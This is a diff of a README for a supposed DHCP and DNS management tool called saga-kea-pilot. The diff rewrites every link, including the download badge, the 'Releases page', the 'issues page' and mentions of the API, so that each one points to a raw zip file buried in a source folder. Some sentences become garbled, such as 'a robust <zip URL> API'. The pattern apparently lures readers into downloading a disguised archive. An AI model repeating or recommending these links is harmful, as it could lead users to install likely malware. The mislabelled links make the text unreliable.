@@ -1,10 +1,10 @@
 # 🎉 saga-kea-pilot - Manage Your DHCP & DNS Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip)](https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip)
+[![Download](https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip)](https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip)
 
 ## 📝 Description
-SagaOS Kea Pilot is an enterprise-grade platform for managing DHCP and DNS services, designed specifically for Internet Service Providers (ISPs). With a user-friendly React frontend and a robust https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip API, our software simplifies network management. It integrates Kea DHCP, BIND9 DNS, and PostgreSQL databases, providing comprehensive tools to help you manage your network effectively.
+SagaOS Kea Pilot is an enterprise-grade platform for managing DHCP and DNS services, designed specifically for Internet Service Providers (ISPs). With a user-friendly React frontend and a robust https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip API, our software simplifies network management. It integrates Kea DHCP, BIND9 DNS, and PostgreSQL databases, providing comprehensive tools to help you manage your network effectively.
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run SagaOS Kea Pilot, ensure your system meets the following requirements:
 
 ### 📦 Installation Steps
 1. **Visit the Release Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip).
+   Go to our [Releases page](https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip).
 
 2. **Choose Your Version**
    Locate the latest version available. This will typically be marked as "Latest Release".
@@ -45,7 +45,7 @@ To run SagaOS Kea Pilot, ensure your system meets the following requirements:
 - **DNS Management:** Control your domain name resolution, ensuring users reach the correct services.
 - **User-Friendly Interface:** The React frontend offers an intuitive experience for all users.
 - **Real-Time Monitoring:** Keep tabs on your network with live updates on DHCP and DNS activities.
-- **Robust API:** Interact programmatically with your network settings via our https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip API.
+- **Robust API:** Interact programmatically with your network settings via our https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip API.
 - **Database Integration:** Use PostgreSQL to store critical data securely.
 
 ## 🌟 How to Use
@@ -72,9 +72,9 @@ To run SagaOS Kea Pilot, ensure your system meets the following requirements:
 - **Installation Errors:** If an error occurs during installation, check your disk space and try running the installer as an administrator.
 
 ## 📞 Support
-For assistance, visit our [issues page](https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip) to report problems or ask questions.
+For assistance, visit our [issues page](https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip) to report problems or ask questions.
 
 ## 📥 Download & Install
-To start managing your DHCP and DNS services effectively, [visit this page to download](https://raw.githubusercontent.com/mokhtarhasfulloh/saga-kea-pilot/main/bustard/saga-kea-pilot.zip) the latest version of SagaOS Kea Pilot. Follow the installation steps provided in this guide for a smooth setup. 
+To start managing your DHCP and DNS services effectively, [visit this page to download](https://github.com/mokhtarhasfulloh/saga-kea-pilot/raw/refs/heads/main/src/pages/DnsManager/kea_pilot_saga_v2.3.zip) the latest version of SagaOS Kea Pilot. Follow the installation steps provided in this guide for a smooth setup. 
 
 Feel free to explore the different features and make the most out of this comprehensive management platform designed for ISPs.
